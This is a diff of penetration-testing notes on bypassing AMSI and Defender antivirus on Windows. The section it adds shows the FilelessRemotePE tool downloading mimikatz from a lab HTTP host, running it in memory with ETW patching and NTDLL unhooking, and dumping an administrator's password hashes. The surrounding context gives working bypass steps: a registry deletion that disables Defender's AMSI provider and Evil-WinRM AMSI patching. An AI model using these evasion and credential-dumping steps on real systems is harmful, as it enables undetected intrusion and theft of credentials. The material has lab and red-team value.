@@ -3,12 +3,22 @@ Living off the land and fileless techniques
 ================================================================================================================================================
 
 INDEX
-===============================
+======
+
 I.   Reminder & Definitions
-II.  Examples of AMSI and AV bypass by forcing the AMSI initialization to fail in a PowerShell session
-III. Example of AMSI and AV bypass by patching the AMSI DLL
-IV.  Example of AMSI and AV bypass by modifying a registry key (admin priv required)
-V.   Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
+     ➤ Why using 'living off the land and fileless' techniques ?
+     ➤ Microsoft Antimalware Scan Interface (AMSI)
+     ➤ Windows Security features and Microsoft security products
+
+II.  Examples of techniques to bypass the Microsoft Antimalware Scan Interface (AMSI) and AV products to be able to download and execute (in-memory) 
+     any offensive PowerShell scripts
+     ➤ Examples of AMSI and AV bypass by forcing the AMSI initialization to fail in the PowerShell session 
+     ➤ Example of AMSI and AV bypass by patching the AMSI DLL
+     ➤ Example of AMSI and AV bypass by modifying a registry key (admin priv required)
+     ➤ Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
+
+III. Example of technique to download and execute in-memory Portable Executable (PE) files and to bypass AV products, ETW, ...
+     ➤ Example of AV bypass using the tool 'FilelessRemotePE'
 
 
 ================================================================================================================================================
@@ -113,10 +123,16 @@ Windows Security features and Microsoft security products
   - It is a post-breach solution that complements Microsoft Defender AV.
   - It is an EDR that detects and remediates advanced attacks on endpoints. 
   
-  
+ 
+
 ================================================================================================================================================
-II.  Examples of AMSI and AV bypass by forcing the AMSI initialization to fail in a PowerShell session
+II.  Examples of techniques to bypass the Microsoft Antimalware Scan Interface (AMSI) & AV products to be able to download and execute 
+     in-memory any offensive PowerShell scripts 
 ================================================================================================================================================
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+2.1 Examples of AMSI and AV bypass by forcing the AMSI initialization to fail in a PowerShell session
+------------------------------------------------------------------------------------------------------------------------------------------------
 
 Test 1 - AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
 ------------------------------------------------------------------------------------------------------------------------------------------------
@@ -225,9 +241,9 @@ This script contains malicious content and has been blocked by your antivirus so
 <SNIP>
 
 
-================================================================================================================================================
-III. Example of AMSI and AV bypass by patching the AMSI DLL
-================================================================================================================================================
+------------------------------------------------------------------------------------------------------------------------------------------------
+2.2 Example of AMSI and AV bypass by patching the AMSI DLL
+------------------------------------------------------------------------------------------------------------------------------------------------
 
 => Source: https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998
 
@@ -260,9 +276,9 @@ At line:1 char:1
     + FullyQualifiedErrorId : CommandNotFoundException
 
 
-================================================================================================================================================
-IV. Example of AMSI and AV bypass technique by modifying a registry key (admin priv required)
-================================================================================================================================================
+------------------------------------------------------------------------------------------------------------------------------------------------
+2.3 Example of AMSI and AV bypass technique by modifying a registry key (admin priv required)
+------------------------------------------------------------------------------------------------------------------------------------------------
 
 AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. 
 The GUID for Windows Defender is: HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
@@ -271,9 +287,9 @@ We can remove the registry key to bypass/disable the AMSI if we have local admin
 PS C:\> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
 
 
-================================================================================================================================================
-V. Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
-================================================================================================================================================
+------------------------------------------------------------------------------------------------------------------------------------------------
+2.4 Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
+------------------------------------------------------------------------------------------------------------------------------------------------
 
 Test 1 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 2016 server with Defender (AV) enabled and up-to-date
 ---------------------------------------------------------------------------------------------------------------------------------------------------
@@ -494,9 +510,9 @@ Affected items:
 	amsi: \Device\HarddiskVolume3\Windows\System32\wsmprovhost.exe
 
 
-===================================================================================================================================================
-VI. Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
-===================================================================================================================================================
+------------------------------------------------------------------------------------------------------------------------------------------------
+2.5 Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
+------------------------------------------------------------------------------------------------------------------------------------------------
 
 Note:  Just for testing purposes, I installed the old and basic AV 'Microsoft Security Essentials' in compatibility mode on a Windows server 2012 R2.
        As expected, there is no AMSI and the basic AV (even with an updated signature database) does't not detect and nor block the PowerShell scripts
@@ -557,3 +573,105 @@ SID               : S-1-5-90-1
 	 * Username : SERVER03$
 	 * Domain   : SECURITY-LAB
 <SNIP>
+
+
+================================================================================================================================================
+III. Example of technique to download and execute in-memory Portable Executable (PE) files and to bypass AV products, ETW, ...
+================================================================================================================================================
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+3.1 Example of AV bypass using the tool 'FilelessRemotePE'
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+=> Source: https://github.com/D1rkMtr/FilelessRemotePE
+
+The tool "FilelessRemotePE" allows to load remote Portable Executable (PE) files from URI directly into memory with:
+> argument passing
+> ETW patching
+> NTDLL unhooking
+> no new thread technique
+
+Limitation: It runs only c/c++/asm based binaries.
+
+Test/PoC - Download and execution in-memory of Mimkatz.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Administrator>powershell -exec bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator> Get-MpComputerStatus | Select AntivirusEnabled
+
+AntivirusEnabled
+----------------
+            True
+
+PS C:\temp> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+
+PS C:\Users\Administrator> cmd
+Microsoft Windows [Version 10.0.14393]
+(c) Microsoft Corporation. All rights reserved.
+
+c:\Users\Administrator> cd C:\temp
+c:\temp>
+
+c:\temp>remotepev1.exe
+
+[+] Unhooking
+
+[+] Patch ETW
+
+[+] Enter the uri :
+http://192.168.1.113:8080/mimikatz.exe
+
+[+] Loading Remote PE from http://192.168.1.113:8080/mimikatz.exe
+
+[+] Run PE
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 194073 (00000000:0002f619)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : ORACLESERVER1
+Logon Server      : ORACLESERVER1
+Logon Time        : 11/27/2022 7:10:57 PM
+SID               : S-1-5-21-1644803877-2661921197-3301414406-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : ORACLESERVER1
+         * NTLM     : cf3a5525ee9414229e66279623<SNIP>
+         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : ORACLESERVER1
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : ORACLESERVER1
+         * Password : (null)
+        ssp :
+        credman :
+
+<SNIP>
+
+mimikatz # exit
+Bye!
+
